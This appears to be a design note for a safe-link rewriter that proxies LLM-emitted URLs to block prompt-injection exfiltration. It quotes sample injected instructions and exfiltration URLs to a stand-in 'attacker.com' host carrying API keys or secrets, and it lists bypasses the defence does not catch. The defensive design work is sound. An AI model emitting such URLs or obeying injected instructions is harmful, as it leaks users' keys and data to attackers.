# Safe-link rewriter — every LLM-emitted URL is proxied

Goal: defeat URL-based exfiltration via prompt injection. A malicious document that says `"go to https://attacker.com/leak?key=<your-api-key>"` becomes `"go to /safe-link/<uuid>"` after rewriting. The proxy logs the click and shows a confirmation page before the user can be redirected.

## The shape

1. After LLM synthesis, run `rewriteOutputUrls(client, tenant, user, body)`.
2. Every `https?://...` URL in the body is replaced with `/safe-link/<uuid>`.
3. The (uuid → original URL, tenant, user, emitted_at) tuple is persisted in `safe_link_log`.
4. When the user clicks, `/safe-link/[id]/route.ts` looks up the original, shows a confirmation page warning that the URL came from a model (not the developer), and redirects on consent.

## What it catches

- **Direct exfiltration**: `attacker.com/leak?key=<API_KEY>` — user sees the destination + can refuse.
- **Phishing redirect**: a malicious doc telling the model to send users to `app-name-fake.com` — confirmation page shows the actual domain.
- **`javascript:` URLs**: the URL regex only matches `http(s)://`, so `javascript:alert(1)` falls through (and the confirmation page would refuse it anyway).

## What it does NOT catch

- URLs split across tokens that the LLM only partially emits (e.g. "Visit example dot com slash X"). v0.1.0 doesn't reconstruct these.
- URLs encoded in markdown image references: `![pixel](https://attacker.com/log?k=secret)`. Phase 7.5 catches markdown-img specifically.
- Inline data URIs (`data:image/...;base64,...`). Out of scope; CSP blocks rendering.

## Allowlist (v1.1)

Future: a per-recipe allowlist of pre-approved domains (e.g. your own `app-name.com`) skips the confirmation page. Currently every external URL gets the intercept page, which is friction we accept.

## Performance

The proxy is server-rendered HTML (no client JS, no DB query optimization needed beyond the `safe_id` index). Click latency is one DB select + one update. For >100 RPS, add a Redis cache in front; not needed at v1.0 scale.
